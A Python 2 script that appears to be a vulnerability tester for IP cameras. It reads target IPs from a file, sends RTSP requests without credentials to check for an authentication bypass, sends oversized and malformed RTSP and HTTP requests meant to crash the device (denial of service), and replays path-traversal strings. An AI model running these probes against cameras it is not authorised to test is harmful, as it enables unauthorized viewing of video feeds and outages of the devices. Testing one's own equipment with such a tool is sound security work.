import socket
import base64
import sys
from time import gmtime, strftime

# Possible Responses
HTTP_404 = 'HTTP/1.1 404 Not Found'
HTTP_400 = 'HTTP/1.1 400 Bad Request'
RTSP_401 = 'RTSP/1.0 401 Unauthorized'

RTSP_PORT = 554
HTTP_PORT = 80
DEF_USER_PASS = 'admin:admin'


fIpCams=open("ipCams.txt")

def get_date():
    hoy = "[" + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + "]"
    return hoy
    
def write_log(string, prtscr):
    g = open("output.log","a")
    g.write(get_date() + string)
    if prtscr:
        print string.replace('\n','')
    g.close()

############################ TEST RTSP ###########################################

def rtsp_auth_describe(cam_ip):
    try:
        ############################################################ Authentication Bypass - Testing DESCRIBE
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP Authentication Bypass - Testing DESCRIBE" + "\r\n", 1)
        rtspUris = open("rtspUris.txt")
        
        for _uri in rtspUris:
            
            uri = _uri.replace('\n','')
            write_log("Testing URI " + uri  + "\r\n", 1)
            
            request = 'DESCRIBE ' + uri + ' RTSP/1.0\r\n'
            request+= 'CSeq: 1\r\n'
            request+= '\r\n'
            
            s = socket.socket()
            s.connect((cam_ip, RTSP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n",0)
            s.send(request)
            response = s.recv(1024)
            if RTSP_401 in response:
                write_log("Test OK" + "\r\n",1)
            else:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                write_log(response + "\r\n", 1)
        return
        rtspUris.close()
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
        rtspUris.close()

def rtsp_auth_setup(cam_ip):
    try:
        ############################################################ Authentication Bypass - Testing SETUP
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP Authentication Bypass - Testing SETUP" + "\r\n", 1)
        rtspUris = open("rtspUris.txt")
        
        for _uri in rtspUris:
            
            uri = _uri.replace('\n','')
            write_log("Testing URI " + uri  + "\r\n", 1)
            
            request = 'SETUP ' + uri + ' RTSP/1.0\r\n'
            request+= 'CSeq: 1\r\n'
            request+= 'Transport: RTP/AVP;unicast;client_port=4588-4589\r\n'
            request+= '\r\n'
            
            s = socket.socket()
            s.connect((cam_ip, RTSP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n",0)
            s.send(request)
            response = s.recv(1024)
            if RTSP_401 in response:
                write_log("Test OK" + "\r\n",1)
            else:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                write_log(response + "\r\n", 1)
        return
        rtspUris.close()
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
        rtspUris.close()

def rtsp_auth_play(cam_ip):
    try:
        ############################################################ Authentication Bypass - Testing PLAY 
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP Authentication Bypass - Testing PLAY" + "\r\n", 1)
        rtspUris = open("rtspUris.txt")
        
        for _uri in rtspUris:
            
            uri = _uri.replace('\n','')
            write_log("Testing URI " + uri  + "\r\n", 1)
            
            request = 'PLAY ' + uri + ' RTSP/1.0\r\n'
            request+= 'CSeq: 1\r\n'
            request+= '\r\n'
            
            s = socket.socket()
            s.connect((cam_ip, RTSP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n",0)
            s.send(request)
            response = s.recv(1024)
            if RTSP_401 in response:
                write_log("Test OK" + "\r\n",1)
            else:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                write_log(response + "\r\n", 1)
        return
        rtspUris.close()
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
        rtspUris.close()

def rtsp_auth_teardown(cam_ip):
    try:
        ############################################################ Authentication Bypass - Testing TEARDOWN 
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP Authentication Bypass - Testing TEARDOWN" + "\r\n", 1)
        rtspUris = open("rtspUris.txt")
        
        for _uri in rtspUris:
            
            uri = _uri.replace('\n','')
            write_log("Testing URI " + uri  + "\r\n", 1)
            
            request = 'TEARDOWN ' + uri + ' RTSP/1.0\r\n'
            request+= 'CSeq: 1\r\n'
            request+= '\r\n'
            
            s = socket.socket()
            s.connect((cam_ip, RTSP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n",0)
            s.send(request)
            response = s.recv(1024)
            if RTSP_401 in response:
                write_log("Test OK" + "\r\n",1)
            else:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                write_log(response + "\r\n", 1)
        return
        rtspUris.close()
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
        rtspUris.close()
        
def rtsp_dos(_cam_ip):  
    try:     
        ############################################################ Denial Of Service  
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP DoS" + "\r\n", 1)
        rtspUris = open("rtspUris.txt")
        cam_ip = _cam_ip.replace('\n','')
        
        for _uri in rtspUris:
            
            uri = _uri.replace('\n','')
            write_log("Testing URI " + uri  + "\r\n", 1)
            auth_big = 'a' * 3000
            request = 'DESCRIBE ' + uri + ' RTSP/1.0\r\n'
            request+= 'CSeq: 1\r\n'
            request+= 'Authorization: Basic %s\r\n' % base64.b64encode(auth_big)
            request+= '\r\n'
                
            s = socket.socket()
            s.connect((cam_ip, RTSP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n", 0)
            s.send(request)
            response = s.recv(1024)
            if response =='':
                s.close()
                write_log("Disconnected" + "\r\n", 0)
                write_log("Trying to connect again..."  + "\r\n",0)
                try:
                    s.connect((cam_ip, RTSP_PORT))
                    write_log("Test OK" + "\r\n",1)
                    s.close()
                    write_log("Disconnected" + "\r\n",0)
                except:
                    write_log("Test FAILED!!!!!" + "\r\n",1)
                    write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
            else:
                write_log("Test OK" + "\r\n",1)
        return
        rtspUris.close()        
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
        rtspUris.close()

def rtsp_dos_setup(cam_ip):  
    try:   
        ############################################################ Denial Of Service 2
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: RTSP DoS - Malformed SETUP" + "\r\n", 1)
        
        s = socket.socket()
        s.connect((cam_ip, RTSP_PORT))
        write_log("Connected to " + cam_ip + ":" + str(RTSP_PORT) + "\r\n", 1)
        setRequest = 'SETUP / RTSP/1.0\r\n\r\n'
        s.send(setRequest)
        response = s.recv(1024)
        if response =='':
            s.close()
            write_log("Disconnected" + "\r\n", 0)
            write_log("Trying to connect again..."  + "\r\n", 0)
            try:
                s.connect((cam_ip, RTSP_PORT))
                write_log("Test OK" + "\r\n", 1)
                s.close()
                write_log("Disconnected" + "\r\n", 0)
            except:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                
        else:
            write_log("Test OK" + "\r\n", 1)
            
        return
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return


############################ TEST HTTP ###########################################

def http_dos(cam_ip):   
    try:      
        ############################################################ Denial Of Service  
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: HTTP DoS" + "\r\n", 1)
        request = 'GET /' + "A" * 3000 + '.html HTTP/1.0\r\n'
        
        s = socket.socket()
        s.connect((cam_ip, HTTP_PORT))
        write_log("Connected to " + cam_ip + ":" + str(HTTP_PORT) + "\r\n", 0)
        s.send(request)
        response = s.recv(1024)
        if response =='':
            s.close()
            write_log("Disconnected" + "\r\n", 0)
            write_log("Trying to connect again..."  + "\r\n", 0)
            try:
                s.connect((cam_ip, HTTP_PORT))
                write_log("Test OK" + "\r\n", 1)
                s.close()
                write_log("Disconnected" + "\r\n", 0)
            except:
                write_log("Test FAILED!!!!!"  + "\r\n", 1)       
        else:
            write_log("Test OK" + "\r\n", 1)

        return
    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return            
                    

def http_path(cam_ip):
    try:
        ############################################################ Path Transversal  
        write_log(":::::::::::::::::::::::::::::::::::::::::::::::::: HTTP Path Transversal" + "\r\n", 1)   
        
        fPathTransversal=open("pathTransversal.txt")
        
        for linea in fPathTransversal:
            request = 'GET ' + linea.replace('\n','') + ' HTTP/1.0\r\n'
            write_log(request + "\r\n", 1)
                
            s = socket.socket()
            s.connect((cam_ip, HTTP_PORT))
            write_log("Connected to " + cam_ip + ":" + str(HTTP_PORT) + "\r\n", 0)
            s.send(request)
            response = s.recv(1024)
            if HTTP_400 in response or HTTP_404 in response:
                write_log("Test OK" + "\r\n", 1)
            else:
                write_log("Test FAILED!!!!!" + "\r\n", 1)
                write_log(response + "\r\n", 1)
                    
            s.close()
            write_log("Disconnected"  + "\r\n"+ "\r\n", 0)
        
        fPathTransversal.close() 
        return                  

    except:
        write_log("Unexpected error:" + str(sys.exc_info()) + "\r\n", 1)
        return
                          
if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        write_log("Arguments are necesary!!", 1)
    

    TEST_RTSP_AUTH_DESCRIBE = 0
    TEST_RTSP_AUTH_SETUP = 0
    TEST_RTSP_AUTH_PLAY = 0
    TEST_RTSP_AUTH_TEARDOWN = 0
    TEST_RTSP_DOS = 0
    TEST_RTSP_DOS_2 = 0
    TEST_HTTP_DOS = 0
    TEST_HTTP_PATH = 0
    
    for x in xrange(1, len(sys.argv)):
        action = sys.argv[x]
        if action == '-rAD':
            TEST_RTSP_AUTH_DESCRIBE = 1
        elif action == '-rAS':
            TEST_RTSP_AUTH_SETUP = 1
        elif action == '-rAP':
            TEST_RTSP_AUTH_PLAY = 1
        elif action == '-rAT':
            TEST_RTSP_AUTH_TEARDOWN = 1
        elif action == '-rA':
            TEST_RTSP_AUTH_DESCRIBE = 1
            TEST_RTSP_AUTH_SETUP = 1
            TEST_RTSP_AUTH_PLAY = 1
            TEST_RTSP_AUTH_TEARDOWN = 1
        elif action == '-rD':
            TEST_RTSP_DOS = 1
        elif action == '-rD2':
            TEST_RTSP_DOS_2 = 1
        elif action == '-hD':
            TEST_HTTP_DOS = 1
        elif action == '-hP':
            TEST_HTTP_PATH = 1
        else:
            write_log("Wrong Argument!! " + action,1)
    
    fIpCams=open("ipCams.txt")
    for _ip in fIpCams:
        ip = _ip.replace('\n','')
        write_log("################################ Testing " + ip + " ################################" + "\r\n", 1)
        if TEST_RTSP_AUTH_DESCRIBE == 1:
            rtsp_auth_describe(ip)
        if TEST_RTSP_AUTH_SETUP == 1:
            rtsp_auth_setup(ip)
        if TEST_RTSP_AUTH_PLAY == 1:
            rtsp_auth_play(ip)
        if TEST_RTSP_AUTH_TEARDOWN == 1:
            rtsp_auth_teardown(ip)
        if TEST_RTSP_DOS == 1:
            rtsp_dos(ip)
        if TEST_RTSP_DOS_2 == 1:
            rtsp_dos_setup(ip)
        if TEST_HTTP_DOS == 1:
            http_dos(ip)
        if TEST_HTTP_PATH == 1:
            http_path(ip)
    
    
    write_log("Test finished"  + "\r\n", 1)
    

